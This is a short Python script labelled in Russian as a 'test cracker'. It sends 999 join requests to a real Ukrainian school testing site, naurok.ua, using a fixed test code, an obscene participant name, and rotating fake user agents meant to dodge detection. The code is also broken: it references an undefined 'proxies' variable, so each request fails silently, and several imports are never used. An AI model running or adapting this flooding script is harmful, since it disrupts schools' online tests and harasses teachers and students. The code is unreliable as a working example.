import random
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')

console.print('''взломщик тестов
''')

for i in range(999):
    kod = '9627399'
    headers = {"UserAgent": fake_useragent.UserAgent().random}
    try:
        requests.post("https://naurok.ua/test/join", data={"JoinForm[code]": kod, "JoinForm[name]" : "hui"}, headers=headers, proxies=proxies)
        print('мае')
    except:
        print('немае')
